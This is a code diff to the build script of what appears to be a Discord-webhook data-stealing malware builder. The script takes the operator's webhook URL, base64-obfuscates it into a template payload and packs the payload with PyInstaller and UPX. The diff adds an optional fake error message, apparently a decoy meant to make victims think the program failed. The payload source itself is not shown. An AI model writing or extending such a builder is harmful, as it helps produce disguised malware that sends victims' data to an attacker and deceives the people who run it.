@@ -28,15 +28,26 @@ def main() -> None:
     print(__BANNER__)
 
     webhook = input("{:<27}: ".format("Discord Webhook?"))
-
+    use_error_message = input("{:<27}: ".format("Use Error Message? (y/n)"))
+    if use_error_message.lower() == "y":
+        error_message = input("{:<27}: ".format("Error Message?"))
+    
     shutil.copytree("./src", f"{__BUILDENV__}/src")
 
     with open(file=f"{__BUILDENV__}/src/main.py", mode="r") as f:
         content = f.read()
 
+    content = content.replace("&WEBHOOK_URL_ENC&", base64.b64encode(webhook.encode("utf-8")).decode("utf-8"))
+    if use_error_message.lower() == "y":
+        content = content.replace("&ERROR_MESSAGE_ENC&", base64.b64encode(error_message.encode("utf-8")).decode("utf-8"))
+        content = content.replace("__USE_ERROR_MESSAGE__ = False", "__USE_ERROR_MESSAGE__ = True")
+        
+    else:
+        content = content.replace("&ERROR_MESSAGE_ENC&", base64.b64encode('NOERRORMESSAGE'.encode("utf-8")).decode("utf-8"))
+
+        
     with open(file=f"{__BUILDENV__}/src/main.py", mode="w") as f:
-        f.write(content.replace("&WEBHOOK_URL_ENC&", base64.b64encode(
-            webhook.encode("utf-8")).decode("utf-8")))
+        f.write(content)
 
     install_pyinstaller()
     install_upx()
